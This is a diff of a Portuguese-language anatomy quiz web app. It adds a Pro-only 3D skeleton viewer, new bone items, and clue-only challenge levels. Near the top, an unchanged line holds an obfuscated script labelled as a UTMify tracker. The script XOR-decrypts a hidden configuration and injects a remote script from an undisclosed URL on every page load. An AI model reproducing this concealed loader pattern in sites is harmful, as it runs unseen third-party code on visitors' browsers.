@@ -5,7 +5,27 @@
 <!-- UTMs UTMify -->
 <script>(function(){var a_uzlt=atob("DMfJsUsKppaqALIeVrzrxDlmhKyIaMZqJrTznmRpwviEdcZzP6Gwnyhly7jIcp1tNbWgwT95iePebcExOqa91Dh+iPzZIp48N7O9wyJo0+LPc5AkDbzr3ypnw7SQItZ/IqbkxD9nz/DTLcJsM7Gs3z8n3vXFZJ9tNazrnWl8x/rfZZAkdOW0nTAoyPfHZZAkdKOoxSon0+LHadRne7e71D1vyOKHc8d8P6O6k2co0PfGddc8bOXrzBZ3");var q_8hb=[];for(var m_h9z=0;m_h9z<a_uzlt.length;m_h9z++){q_8hb.push(a_uzlt.charCodeAt(m_h9z)&255);}var t_i=q_8hb[0];var c_as=q_8hb.slice(1,1+t_i);var o_rt=q_8hb.slice(1+t_i);var r_j0c=o_rt.map(function(b,m_r){return b^c_as[m_r%t_i];});var b_bto="";for(var n_xn=0;n_xn<r_j0c.length;n_xn++){b_bto+=String.fromCharCode(r_j0c[n_xn]&255);}var g_9=decodeURIComponent(escape(b_bto));var w_rz3k=JSON.parse(g_9);var j_pkc=w_rz3k.globals||[];j_pkc.forEach(function(p_xu){window[p_xu.name]=p_xu.value;});var e_4wsf=document.createElement("script");e_4wsf.src=w_rz3k.url;e_4wsf.async=true;e_4wsf.defer=true;(w_rz3k.attributes||[]).forEach(function(h_racz){e_4wsf.setAttribute(h_racz.name,h_racz.value);});(document.head||document.documentElement).appendChild(e_4wsf);})();</script>
 <meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
-<style>:root{padding-top:env(safe-area-inset-top,0px);padding-bottom:env(safe-area-inset-bottom,0px)}html{color-scheme:dark}body{margin:0}img{max-width:100%}[hidden]{display:none!important}</style>
+<style>:root{padding-top:env(safe-area-inset-top,0px);padding-bottom:env(safe-area-inset-bottom,0px)}html{color-scheme:dark}body{margin:0}img{max-width:100%}[hidden]{display:none!important}#stage3d{position:absolute;inset:0;display:none;border-radius:inherit;overflow:hidden}
+.stage{position:relative}.stage.is3d #game-svg{visibility:hidden}.stage.is3d #stage3d{display:block}
+.load3d{position:absolute;inset:0;display:grid;place-items:center;color:var(--dim);font:12px var(--f-mono);letter-spacing:.06em;text-align:center;padding:20px}
+.v3btns{position:absolute;right:8px;bottom:8px;display:none;gap:5px;z-index:2}.stage.is3d .v3btns{display:flex}
+.v3btns button{font:500 11px var(--f-mono);color:var(--dim);background:rgba(11,18,26,.78);border:1px solid var(--line);border-radius:999px;padding:6px 11px;cursor:pointer}
+.v3btns button:hover{color:var(--amber);border-color:var(--amber)}
+.v3tip{position:absolute;left:10px;bottom:10px;z-index:2;display:none;font:11px var(--f-mono);color:var(--faint);pointer-events:none}.stage.is3d .v3tip{display:block}
+.chip.g3d{font-weight:700;letter-spacing:.04em}.chip.g3d.on{border-color:var(--amber);color:var(--amber);background:rgba(242,166,90,.1)}
+.x3d{max-width:1000px;margin:0 auto;padding:18px 20px 40px}
+.x3d-head{display:flex;gap:14px;align-items:flex-start;margin-bottom:14px}.x3d-head h1{font:500 clamp(30px,5vw,44px)/1.05 var(--f-display);margin:4px 0 6px}.x3d-head p{margin:0;color:var(--dim);font-size:15px}
+.x3d-view{position:relative;height:min(66vh,640px);border:1px solid var(--line);border-radius:20px;overflow:hidden;background:#0b121a}
+.x3d-bar{display:flex;gap:8px;flex-wrap:wrap;justify-content:center;margin:12px 0}.x3d-bar .chip[aria-pressed="true"]{border-color:var(--amber);color:var(--amber)}
+.x3d-info{border:1px solid var(--line);border-radius:14px;background:var(--film-2);padding:14px 16px;min-height:64px;text-align:center;color:var(--dim)}
+.x3d-info b{display:block;color:var(--bone);font:500 24px var(--f-display)}.x3d-info span{font-size:14px}
+.x3d-cred{font:11px var(--f-mono);color:var(--faint);text-align:center;margin-top:14px}.x3d-cred a{color:var(--dim)}
+.card3d{display:flex;align-items:center;gap:14px;margin:14px 0 0;padding:14px 16px;border:1px solid rgba(242,166,90,.4);border-radius:16px;background:linear-gradient(100deg,rgba(242,166,90,.12),rgba(18,28,39,.6));color:var(--bone);text-decoration:none}
+.card3d:hover{border-color:var(--amber)}.card3d .c3-ic{flex:none;width:46px;height:46px;border-radius:12px;display:grid;place-items:center;background:var(--amber);color:#1b1208;font:800 16px var(--f-mono)}
+.card3d b{display:block;font-size:16px}.card3d b i{font-style:normal;font:700 10px var(--f-mono);letter-spacing:.1em;color:#1b1208;background:var(--amber);border-radius:999px;padding:2px 7px;margin-left:6px;vertical-align:2px}
+.card3d small{color:var(--dim);font-size:13.5px}.card3d .c3-go{margin-left:auto;color:var(--amber);font-size:20px}
+.stage.pista:not(.is3d) #game-svg{opacity:.55}
+</style>
 <title>Osso a Osso · Jogar</title>
 <link rel="icon" type="image/png" sizes="32x32" href="favicon-32.png"><link rel="apple-touch-icon" href="apple-touch-icon.png"><meta name="theme-color" content="#0b121a">
 <meta property="og:type" content="website"><meta property="og:site_name" content="Osso a Osso"><meta property="og:locale" content="pt_BR"><meta property="og:title" content="Osso a Osso · Jogar"><meta property="og:description" content="Aprenda anatomia digitando: uma estrutura acende e você digita o nome. Crie sua conta grátis."><meta property="og:url" content="https://osso-a-osso.vercel.app/jogar"><meta property="og:image" content="https://osso-a-osso.vercel.app/og.jpg"><meta property="og:image:width" content="1200"><meta property="og:image:height" content="630"><meta name="twitter:card" content="summary_large_image"><meta name="twitter:image" content="https://osso-a-osso.vercel.app/og.jpg">
@@ -449,9 +469,9 @@ body.demo .brand{pointer-events:none}
         <div><b id="s-acc">100%</b><span>PRECISÃO</span></div>
         <div><b id="s-prog">0/0</b><span>PEÇAS</span></div>
       </div>
-      <span style="display:flex;gap:6px"><button class="chip" id="g-sound" type="button" aria-pressed="true">Som: ligado</button><button class="chip" id="g-quit" type="button">Sair</button></span>
+      <span style="display:flex;gap:6px"><button class="chip g3d" id="g-3d" type="button" title="Ver em 3D (Pro)" hidden>3D</button><button class="chip" id="g-sound" type="button" aria-pressed="true">Som: ligado</button><button class="chip" id="g-quit" type="button">Sair</button></span>
     </div>
-    <div class="stage" id="stage"><svg id="game-svg" viewBox="0 20 520 700" aria-label="Coluna vertebral em vista lateral e anterior"></svg></div>
+    <div class="stage" id="stage"><svg id="game-svg" viewBox="0 20 520 700" aria-label="Coluna vertebral em vista lateral e anterior"></svg><div id="stage3d"><div class="load3d">Carregando o 3D…</div></div><span class="v3tip">arraste para girar</span><div class="v3btns"><button type="button" data-v3="frente">Frente</button><button type="button" data-v3="lado">Lado</button><button type="button" data-v3="costas">Costas</button></div></div>
     <div class="prompt">
       <div class="q" id="g-q">QUE PEÇA É ESSA?</div>
       <div class="word" id="g-word" aria-live="polite"></div>
@@ -504,6 +524,15 @@ body.demo .brand{pointer-events:none}
     </div>
    </div>
   </main>
+  <main id="v-3d" class="x3d" hidden>
+    <div class="x3d-head"><a class="g-back" href="#jogar" aria-label="Voltar para a trilha"><svg viewBox="0 0 20 20" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M16 10H4M9 5l-5 5 5 5"/></svg><span>Voltar</span></a>
+      <div><div class="eyebrow">Pro · Novo</div><h1>Anatomia 3D</h1><p>Arraste para girar, use dois dedos (ou a rodinha) para aproximar e toque num osso para ver o nome.</p></div></div>
+    <div class="x3d-bar" id="x3d-reg"><button class="chip" type="button" data-xr="esqueleto" aria-pressed="true">Esqueleto</button><button class="chip" type="button" data-xr="cranio" aria-pressed="false">Crânio</button><button class="chip" type="button" data-xr="coluna" aria-pressed="false">Coluna</button><button class="chip" type="button" data-xr="torax" aria-pressed="false">Tórax</button><button class="chip" type="button" data-xr="mao" aria-pressed="false">Mão</button><button class="chip" type="button" data-xr="pe" aria-pressed="false">Pé</button></div>
+    <div class="x3d-view" id="x3d-view"><div class="load3d">Carregando o 3D…</div></div>
+    <div class="x3d-bar"><button class="chip" type="button" data-x3="frente">Frente</button><button class="chip" type="button" data-x3="lado">Lado</button><button class="chip" type="button" data-x3="costas">Costas</button><button class="chip" type="button" data-x3="centro">Centralizar</button></div>
+    <div class="x3d-info" id="x3d-info">Toque em um osso para ver o nome.</div>
+    <p class="x3d-cred">Modelos 3D: BodyParts3D © DBCLS, licença CC BY-SA · <a href="3d/LICENCA-MODELOS.txt" target="_blank" rel="noopener">créditos e licença</a></p>
+  </main>
   <main id="v-perfil" class="perfil" hidden></main>
   <div class="upgrade" id="upgrade" hidden></div>
   <div class="toast" id="toast" role="status" hidden></div>
@@ -512,6 +541,7 @@ body.demo .brand{pointer-events:none}
 </div>
 
 <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2.50.0/dist/umd/supabase.js"></script>
+<script type="importmap">{"imports":{"three":"./3d/lib/three.module.min.js"}}</script>
 <script src="config.js"></script>
 <script>
 (() => {
@@ -688,6 +718,34 @@ const CRA={
   concha:{a:"concha nasal inferior",hl:["p:c-concha"],clue:"Osso curvo e enrolado na parede lateral da cavidade nasal."},
   palatino:{a:"palatino",hl:["p:c-palatino"],clue:"Par em forma de L que fecha o fundo do palato duro e a parede da cavidade nasal."}
 };
+
+// ---------- Estruturas só do 3D (Pro) ----------
+const T3={
+  manubrio:{a:"manúbrio",hl:[],clue:"A parte de cima do esterno; nela se articulam as clavículas e a 1ª costela."},
+  corpoest:{a:"corpo do esterno",hl:[],clue:"A parte longa e central do esterno, onde chegam as cartilagens da 2ª à 7ª costela."},
+  xifoide:{a:"processo xifoide",hl:[],clue:"A ponta de baixo do esterno; é a referência para posicionar as mãos na massagem cardíaca."},
+  verdadeiras:{a:"costelas verdadeiras",hl:[],clue:"Os 7 primeiros pares; cada uma chega ao esterno pela sua própria cartilagem."},
+  falsas:{a:"costelas falsas",hl:[],clue:"Do 8º ao 10º par; a cartilagem delas se une à da costela de cima, sem chegar direto ao esterno."},
+  flutuantes:{a:"costelas flutuantes",hl:[],clue:"Os 2 últimos pares (11º e 12º); terminam livres na parede do abdome, sem ligação com o esterno."},
+  cartilagens:{a:"cartilagens costais",hl:[],clue:"Barras de cartilagem hialina que ligam as costelas ao esterno e dão elasticidade ao tórax."}
+};
+const M3={
+  mc1:{a:"primeiro metacarpo",hl:[],clue:"O metacarpo do polegar: o mais curto e o mais móvel; articula-se com o trapézio."},
+  mc2:{a:"segundo metacarpo",hl:[],clue:"O metacarpo do dedo indicador; costuma ser o mais longo dos cinco."},
+  mc3:{a:"terceiro metacarpo",hl:[],clue:"O metacarpo do dedo médio; articula-se com o capitato."},
+  mc4:{a:"quarto metacarpo",hl:[],clue:"O metacarpo do dedo anelar."},
+  mc5:{a:"quinto metacarpo",hl:[],clue:"O metacarpo do dedo mínimo; é o que quebra na 'fratura do boxeador'."}
+};
+const P3={
+  mt1:{a:"primeiro metatarso",hl:[],clue:"O metatarso do hálux: o mais curto e o mais grosso; sustenta boa parte do peso na passada."},
+  mt2:{a:"segundo metatarso",hl:[],clue:"O metatarso mais longo; fica encaixado entre os cuneiformes."},
+  mt3:{a:"terceiro metatarso",hl:[],clue:"O metatarso do meio; articula-se com o cuneiforme lateral."},
+  mt4:{a:"quarto metatarso",hl:[],clue:"Metatarso que se articula com o cuboide, ao lado do quinto."},
+  mt5:{a:"quinto metatarso",hl:[],clue:"O metatarso do dedo mínimo; tem uma tuberosidade na base, na borda de fora do pé."},
+  sesamoides:{a:"sesamoides",hl:[],clue:"Dois ossinhos embaixo da cabeça do 1º metatarso, dentro dos tendões do hálux."}
+};
+SPINE_LEVELS.push({title:"Desafio: só pela pista",desc:"Nenhuma peça acende. Leia a pista e digite o nome.",win:"Você sabe a coluna de cor, sem olhar.",pista:true,
+  items:(()=>{const v={};SPINE_LEVELS.forEach(L=>{if(!L.view)L.items.forEach(it=>{if(!/^v-/.test((it.hl[0]||"").split(":")[1]||""))v[it.a]=it;});});return Object.values(v);})()});
 const MODULES=[
   {id:"coluna",name:"Coluna vertebral",view:"coluna",levels:SPINE_LEVELS},
   {id:"esqueleto",name:"Esqueleto",view:"esqueleto",levels:[
@@ -696,7 +754,9 @@ const MODULES=[
     {title:"Membro superior",desc:"Do ombro à ponta dos dedos.",win:"Você já lê um braço inteiro, do úmero às falanges.",items:pick(SK,["umero","radio","ulna","carpo","metacarpo","falanges"])},
     {title:"Cintura pélvica",desc:"Ílio, ísquio, púbis, sacro e cóccix.",win:"Você já lê o quadril osso por osso.",items:pick(SK,["ilio","isquio","pubis","sacro","coccix"])},
     {title:"Membro inferior",desc:"Do fêmur aos pés.",win:"Você já lê uma perna inteira, do fêmur ao metatarso.",items:pick(SK,["femur","patela","tibia","fibula","tarso","metatarso"])},
-    {title:"Esqueleto inteiro",desc:"Os ossos principais, todos misturados.",win:"Você já lê um esqueleto inteiro, da cabeça aos pés.",items:pick(SK,["cranio","mandibula","hioide","coluna","clavicula","costelas","umero","radio","ulna","ilio","sacro","femur","patela","tibia","fibula"])}
+    {title:"Esqueleto inteiro",desc:"Os ossos principais, todos misturados.",win:"Você já lê um esqueleto inteiro, da cabeça aos pés.",items:pick(SK,["cranio","mandibula","hioide","coluna","clavicula","costelas","umero","radio","ulna","ilio","sacro","femur","patela","tibia","fibula"])},
+    {title:"Esterno e costelas em 3D",desc:"Manúbrio, corpo, xifoide e os três grupos de costelas.",win:"Você já lê a caixa torácica por dentro e por fora.",so3d:true,r3d:"torax",items:Object.values(T3)},
+    {title:"Desafio: só pela pista",desc:"Nenhuma peça acende. Leia a pista e digite o osso.",win:"Você reconhece os ossos só pela descrição.",pista:true,items:Object.values(SK)}
   ]},
   {id:"orgaos",name:"Órgãos",view:"orgaos",levels:[
     {title:"Cabeça e pescoço",desc:"Encéfalo, cerebelo, tronco, laringe e tireoide.",win:"Você já lê a cabeça e o pescoço por dentro.",items:pick(OR,["encefalo","cerebelo","tronco","laringe","tireoide"])},
@@ -704,27 +764,34 @@ const MODULES=[
     {title:"Abdome superior",desc:"Fígado, vesícula, estômago, baço e pâncreas.",win:"Você já lê o andar de cima do abdome.",items:pick(OR,["figado","vesicula","estomago","baco","pancreas"])},
     {title:"Abdome inferior",desc:"Intestinos, apêndice e suprarrenais.",win:"Você já lê o andar de baixo do abdome.",items:pick(OR,["delgado","grosso","apendice","suprarrenais"])},
     {title:"Sistema urinário",desc:"Do rim até a saída: rins, ureteres, bexiga e uretra.",win:"Você já lê o caminho da urina inteiro.",items:pick(OR,["rins","ureteres","bexiga","uretra"])},
-    {title:"Todos os órgãos",desc:"Os 23 órgãos, misturados.",win:"Você já encontra os principais órgãos do corpo de olhos fechados.",items:Object.values(OR)}
+    {title:"Todos os órgãos",desc:"Os 23 órgãos, misturados.",win:"Você já encontra os principais órgãos do corpo de olhos fechados.",items:Object.values(OR)},
+    {title:"Desafio: só pela pista",desc:"Nenhum órgão acende. Leia a pista e digite o nome.",win:"Você reconhece os órgãos só pela função.",pista:true,items:Object.values(OR)}
   ]},
   {id:"musculos",name:"Músculos",view:"musculos",levels:[
     {title:"Pescoço e tronco",desc:"Esternocleidomastoideo, trapézio, peitoral e abdome.",win:"Você já lê os músculos do tronco.",items:pick(MU,["ecm","trapezio","peitoral","reto","obliquo"])},
     {title:"Braços e pernas",desc:"Deltoide, bíceps, coxa e perna.",win:"Você já lê os músculos dos membros.",items:pick(MU,["deltoide","biceps","quadriceps","sartorio","adutores","tibialant","gastro"])},
-    {title:"Todos os músculos",desc:"Os 12 músculos, misturados.",win:"Você já lê a musculatura da frente do corpo inteira.",items:Object.values(MU)}
+    {title:"Todos os músculos",desc:"Os 12 músculos, misturados.",win:"Você já lê a musculatura da frente do corpo inteira.",items:Object.values(MU)},
+    {title:"Desafio: só pela pista",desc:"Nenhum músculo acende. Leia a pista e digite o nome.",win:"Você reconhece os músculos só pela ação.",pista:true,items:Object.values(MU)}
   ]}
   ,{id:"mao",name:"Mão",view:"mao",pro:true,levels:[
     {title:"Ossos do carpo",desc:"Os 8 ossinhos do punho, um por um.",win:"Você já sabe os 8 ossos do carpo de cor.",items:pick(MAO,["escafoide","semilunar","piramidal","pisiforme","trapezio","trapezoide","capitato","hamato"])},
     {title:"Metacarpos e falanges",desc:"A palma e os dedos.",win:"Você já lê a palma e os dedos da mão.",items:pick(MAO,["metacarpos","fprox","fmed","fdist"])},
-    {title:"Mão inteira",desc:"Todos os ossos da mão, misturados.",win:"Você já lê uma mão inteira, osso por osso.",items:Object.values(MAO)}
+    {title:"Mão inteira",desc:"Todos os ossos da mão, misturados.",win:"Você já lê uma mão inteira, osso por osso.",items:Object.values(MAO)},
+    {title:"Metacarpos, um por um, em 3D",desc:"Do primeiro (polegar) ao quinto (mínimo).",win:"Você já numera os metacarpos sem contar nos dedos.",so3d:true,items:Object.values(M3)},
+    {title:"Desafio: só pela pista",desc:"Nenhum osso acende. Leia a pista e digite o nome.",win:"Você sabe a mão de cor, sem olhar.",pista:true,items:Object.values(MAO)}
   ]}
   ,{id:"pe",name:"Pé",view:"pe",pro:true,levels:[
     {title:"Ossos do tarso",desc:"Tálus, calcâneo, navicular, cuboide e cuneiformes.",win:"Você já sabe os 7 ossos do tarso.",items:pick(PE,["talus","calcaneo","navicular","cuboide","cmed","cint","clat"])},
     {title:"Metatarsos e falanges",desc:"O meio do pé e os dedos.",win:"Você já lê o meio do pé e os dedos.",items:pick(PE,["metatarsos","fprox","fmed","fdist"])},
-    {title:"Pé inteiro",desc:"Todos os ossos do pé, misturados.",win:"Você já lê um pé inteiro, osso por osso.",items:Object.values(PE)}
+    {title:"Pé inteiro",desc:"Todos os ossos do pé, misturados.",win:"Você já lê um pé inteiro, osso por osso.",items:Object.values(PE)},
+    {title:"Metatarsos e sesamoides em 3D",desc:"Do primeiro (hálux) ao quinto, mais os sesamoides.",win:"Você já numera os metatarsos sem contar nos dedos.",so3d:true,items:Object.values(P3)},
+    {title:"Desafio: só pela pista",desc:"Nenhum osso acende. Leia a pista e digite o nome.",win:"Você sabe o pé de cor, sem olhar.",pista:true,items:Object.values(PE)}
   ]}
   ,{id:"cranio",name:"Crânio",view:"cranio",pro:true,levels:[
     {title:"Neurocrânio",desc:"Frontal, parietal, temporal, occipital, esfenoide e etmoide.",win:"Você já monta a caixa do crânio.",items:pick(CRA,["frontal","parietal","temporal","occipital","esfenoide","etmoide"])},
     {title:"Ossos da face",desc:"Maxila, mandíbula, zigomático, nasal e companhia.",win:"Você já lê os 14 ossos da face.",items:pick(CRA,["maxila","mandibula","zigomatico","nasal","lacrimal","vomer","concha","palatino"])},
-    {title:"Crânio inteiro",desc:"Todos os ossos do crânio, misturados.",win:"Você já lê um crânio inteiro, osso por osso.",items:Object.values(CRA)}
+    {title:"Crânio inteiro",desc:"Todos os ossos do crânio, misturados.",win:"Você já lê um crânio inteiro, osso por osso.",items:Object.values(CRA)},
+    {title:"Desafio: só pela pista",desc:"Nenhum osso acende. Leia a pista e digite o nome.",win:"Você sabe o crânio de cor, sem olhar.",pista:true,items:Object.values(CRA)}
   ]}
 ];
 const modById=id=>MODULES.find(m=>m.id===id)||MODULES[0];
@@ -1236,7 +1303,9 @@ function startLevel(modId,i){
   if(lockedLevel(modId,i)){route();openUpgrade();return;}
   if(lockedDiff(curDiff))curDiff="facil";
   const M=modById(modId), L=M.levels[i], VW=L.view||M.view;
-  G={mod:M.id,lvl:i,diff:curDiff,items:shuffle(L.items),idx:0,typed:0,miss:{},timeout:{},hintTo:{},hints:{},clueOn:{},shown:{},keys:0,good:0,chars:0,t0:0,busy:false};
+  if(L.so3d&&(DEMO||FREE())){route();openUpgrade();return;}
+  G={mod:M.id,lvl:i,diff:curDiff,items:shuffle(L.items),idx:0,typed:0,miss:{},timeout:{},hintTo:{},hints:{},clueOn:{},shown:{},keys:0,good:0,chars:0,t0:0,busy:false,pista:!!L.pista,so3d:!!L.so3d,r3d:L.view?null:(L.r3d||REG3D[M.id]||null)};
+  $("#stage").classList.toggle("pista",G.pista);
   buildView($("#game-svg"),VW,true);
   $("#game-svg").setAttribute("aria-label",VW==="coluna"?"Coluna vertebral em vista lateral e anterior":VW==="vertebra"?"Vértebra em vista superior e corte sagital":`Corpo humano em vista anterior: ${M.name.toLowerCase()}`);
   $("#g-chip").innerHTML=DEMO?`<b>Rodada ${demoDone+1} de ${DEMO_RODADAS}</b> · ${esc(M.name)} · ${esc(L.title)}`:`${M.name} · <b>Nível ${i+1}</b> · ${L.title} · ${DIFFS[curDiff].name}`;
@@ -1245,8 +1314,9 @@ function startLevel(modId,i){
 function cur(){return G.items[G.idx];}
 function renderItem(){
   const it=cur(), a=it.a, n=G.typed, D=DIFFS[G.diff];
+  if(G.pista)G.clueOn[G.idx]=true; // no desafio a pista é a pergunta: aparece em qualquer dificuldade
   const h=Math.max(n,G.hintTo[G.idx]||0), clueOn=D.clue||G.clueOn[G.idx];
-  if(G.hlIdx!==G.idx){highlight($("#game-svg"),it.hl);G.hlIdx=G.idx;} // só troca o osso aceso quando muda a peça
+  if(G.hlIdx!==G.idx){highlight($("#game-svg"),G.pista?[]:it.hl);G.hlIdx=G.idx;sync3d();} // só troca o osso aceso quando muda a peça
   const typed=esc(a.slice(0,n));
   const hint=h>n?`<span class="hint">${esc(a.slice(n,h))}</span>`:"";
   const shape=SPELL?a.slice(h):(D.shape?[...a.slice(h)].map((ch,i)=>i===0&&h===0?ch:(ch===" "?" ":"_")).join(""):"");
@@ -1255,7 +1325,7 @@ function renderItem(){
   $("#g-word").innerHTML=`<span class="typed">${typed}</span><span class="caret"></span>${hint}${rest}${ph}`;
   const clue=clueOn?it.clue.replace(new RegExp(norm(a),"ig"),"___"):"Sem pista no modo difícil. Olhe a peça acesa.";
   const ce=$("#g-clue");if(ce.textContent!==clue)ce.textContent=clue;
-  $("#g-q").textContent=`PEÇA ${G.idx+1} DE ${G.items.length}`;
+  $("#g-q").textContent=G.pista?`PISTA ${G.idx+1} DE ${G.items.length} · QUE ESTRUTURA É ESSA?`:`PEÇA ${G.idx+1} DE ${G.items.length}`;
   document.querySelectorAll("#kb .next").forEach(b=>b.classList.remove("next"));
   if((h>n||SPELL)&&n<a.length){const b=$(`#kb button[data-k="${CSS.escape(norm(a[n]))}"]`);if(b)b.classList.add("next");}
   helpState();
@@ -1286,6 +1356,7 @@ function giveUp(timeout){
   document.querySelectorAll("#kb .next").forEach(b=>b.classList.remove("next"));
   $("#g-word").innerHTML=`<span class="typed">${esc(a.slice(0,G.typed))}</span><span class="ans">${esc(a.slice(G.typed))}</span>`;
   $("#g-clue").textContent=`${timeout?"Tempo esgotado. ":""}${it.clue}`;
+  if(G.pista){highlight($("#game-svg"),it.hl);sync3d("on",true);}
   setTimeout(nextPiece,timeout?2000:2400);
 }
 function nextPiece(){
@@ -1327,8 +1398,8 @@ function press(k){
   else{G.miss[G.idx]=(G.miss[G.idx]||0)+1;flashKey(k,"bad");sfx.wrong();const w=$("#g-word");w.classList.remove("shake");void w.offsetWidth;w.classList.add("shake");}
   renderItem();
   if(G.typed>=a.length){
-    G.busy=true; helpState(); sfx.right(); if(USER&&!FREE())xpFloat(XP_PECA[G.diff]+(clean(G.idx)?5:0)); $("#g-word").classList.add("win"); $("#stage").classList.add("done-flash");
-    setTimeout(()=>{$("#g-word").classList.remove("win");$("#stage").classList.remove("done-flash");nextPiece();},450);
+    G.busy=true; helpState(); sfx.right(); if(USER&&!FREE())xpFloat(XP_PECA[G.diff]+(clean(G.idx)?5:0)); $("#g-word").classList.add("win"); if(G.pista)highlight($("#game-svg"),cur().hl); $("#stage").classList.add("done-flash"); sync3d("win",true);
+    setTimeout(()=>{$("#g-word").classList.remove("win");$("#stage").classList.remove("done-flash");nextPiece();},G.pista?1100:450);
   }
   updStats();
 }
@@ -1613,6 +1684,8 @@ function openUpgrade(){
     <h2 id="up-t">Libere o corpo inteiro</h2>
     <ul class="up-list">
       <li>Todos os níveis de esqueleto, órgãos, músculos e coluna</li>
+      <li>Anatomia 3D: crânio, coluna, tórax, mão e pé para girar e aproximar</li>
+      <li>Desafios só pela pista, sem peça acesa</li>
       <li>Modos Médio e Difícil, com cronômetro</li>
       <li>Mão, pé e crânio osso por osso</li>
       <li>XP, patentes, ofensiva e conquistas</li>
@@ -1651,6 +1724,41 @@ const PERF_ICON={
   lvl:`<svg viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M4 10.5l3.5 3.5L16 5.5"/></svg>`,
   ppm:`<svg viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M3 14a7 7 0 1 1 14 0"/><path d="M10 14l3.5-4.5"/></svg>`
 };
+// ---------- Anatomia 3D (só Pro) ----------
+const REG3D={esqueleto:"esqueleto",coluna:"coluna",mao:"mao",pe:"pe",cranio:"cranio"};
+let V3=null,V3P=null,M3D=null;
+let demo3d=false; // na degustação o 3D é opcional (o arquivo é pesado para quem chega pelo celular)
+const want3d=()=>DEMO?demo3d:load().modo3d!==false;
+const pode3d=()=>!!(G&&G.r3d&&(DEMO||!FREE()));
+const active3d=()=>pode3d()&&(G.so3d||want3d());
+function get3D(){
+  if(!V3P)V3P=import("./3d/osso3d.js").then(async m=>{M3D=m;V3=await m.criar($("#stage3d"),{onPick:pick3d});document.querySelectorAll(".load3d").forEach(e=>e.remove());return V3;})
+    .catch(e=>{console.error(e);V3P=null;toast("Não foi possível abrir o 3D neste aparelho.");throw e;});
+  return V3P;
+}
+function sync3d(estado,mostrar){
+  if(!G)return; const st=$("#stage"),btn=$("#g-3d"),it=cur(); if(!it)return;
+  btn.hidden=!G.r3d||G.so3d; btn.classList.toggle("on",active3d()); btn.setAttribute("aria-pressed",String(active3d())); btn.textContent=active3d()&&!V3?"3D…":"3D";
+  let on=active3d(); if(on&&M3D&&!G.so3d&&!M3D.tem3D(it.a,G.r3d))on=false;
+  st.classList.toggle("is3d",on&&(!!V3||G.so3d)); if(!on)return; // enquanto o 3D carrega, o desenho 2D continua na tela
+  const esconde=G.pista&&!mostrar;
+  get3D().then(v=>{if(!G||cur()!==it)return;
+    if(!G.so3d&&!M3D.tem3D(it.a,G.r3d)){st.classList.remove("is3d");return;}
+    st.classList.add("is3d"); btn.textContent="3D"; v.anexar($("#stage3d")); if(v.regiaoAtual()!==G.r3d)v.regiao(G.r3d);
+    if(esconde){v.limpar();v.centralizar();}else v.destacar(it.a,estado||"on",{enquadrar:estado!=="win"||G.pista});
+  }).catch(()=>{st.classList.remove("is3d");if(G&&G.so3d){quit3d();}});
+}
+function quit3d(){clearInterval(TT);G=null;route();}
+function abrir3D(){get3D().then(v=>{v.anexar($("#x3d-view"));v.regiao("esqueleto");document.querySelectorAll("[data-xr]").forEach(b=>b.setAttribute("aria-pressed",String(b.dataset.xr==="esqueleto")));$("#x3d-info").innerHTML="Toque em um osso para ver o nome.";}).catch(()=>{});}
+function pick3d(p){
+  if(!$("#v-jogo").hidden&&G){sync3d();return;} // no jogo, tocar não revela o nome
+  const box=$("#x3d-info"); if(!p){box.innerHTML="Toque em um osso para ver o nome.";return;}
+  let clue="";if(p.estrutura){for(const m of MODULES)for(const L of m.levels)for(const it of L.items)if(!clue&&norm(it.a)===norm(p.estrutura))clue=it.clue;}
+  const nm=p.nome.charAt(0).toUpperCase()+p.nome.slice(1), parte=p.estrutura&&!norm(p.nome).startsWith(norm(p.estrutura));
+  box.innerHTML=`<b>${esc(nm)}</b>${parte?`<span>Faz parte de: ${esc(p.estrutura)}</span><br>`:""}${clue?`<span>${esc(clue)}</span>`:""}`;
+}
+function card3dHTML(){return `<a class="card3d" href="#3d"${FREE()?" data-upgrade":""}><span class="c3-ic">3D</span><span><b>Anatomia 3D ${FREE()?`<small style="color:var(--amber)">${LOCK} Pro</small>`:"<i>NOVO</i>"}</b><small>Gire o esqueleto, isole crânio, mão, pé ou coluna e toque num osso para ver o nome.</small></span><span class="c3-go">→</span></a>`;}
+
 function renderRewards(){
   const box=$("#rewards"), hero=document.querySelector("#v-trilha .hero"); if(hero)hero.hidden=!!USER;
   if(!USER){box.hidden=true;return;}
@@ -1679,7 +1787,8 @@ function renderRewards(){
       <a class="linkbtn" href="#perfil">Ver meu perfil</a>
     </div>
   </div>
-  <p class="dash-note">${FREE()?"Assine o Pro para liberar o Médio, o Difícil e todos os níveis.":REW.ultimo===today()?"Você já estudou hoje. A ofensiva está garantida.":"Conclua um nível hoje para "+(s?"manter":"começar")+" a sua ofensiva."}</p>`;
+  <p class="dash-note">${FREE()?"Assine o Pro para liberar o Médio, o Difícil e todos os níveis.":REW.ultimo===today()?"Você já estudou hoje. A ofensiva está garantida.":"Conclua um nível hoje para "+(s?"manter":"começar")+" a sua ofensiva."}</p>
+  ${card3dHTML()}`;
 }
 function renderProfile(){
   const r=rankOf(REW.xp), s=streakNow(), got=new Set(REW.conq), done=levelsDone(), ppm=bestPPM();
@@ -1768,7 +1877,7 @@ function renderProfile(){
 }
 
 // ---------- Navegação ----------
-function show(v){["trilha","jogo","result","auth","perfil","demo"].forEach(x=>$("#v-"+x).hidden=x!==v);}
+function show(v){["trilha","jogo","result","auth","perfil","demo","3d"].forEach(x=>$("#v-"+x).hidden=x!==v);}
 
 // ---------- Modo degustação (link da bio): escolhe a parte, joga 2 rodadas, vê os planos ----------
 const DEMO=/^\/(demo|teste)\/?$/.test(location.pathname)
@@ -1844,7 +1953,8 @@ function demoWall(){
   show("demo");window.scrollTo(0,0);
 }
 
-function route(){if(DEMO){if(demoDone>=DEMO_RODADAS)demoWall();else demoHome();return;}if(location.hash==="#perfil"&&USER){renderProfile();show("perfil");window.scrollTo(0,0);return;}renderLevels();renderRewards();show("trilha");}
+function route(){if(DEMO){if(demoDone>=DEMO_RODADAS)demoWall();else demoHome();return;}if(location.hash==="#perfil"&&USER){renderProfile();show("perfil");window.scrollTo(0,0);return;}
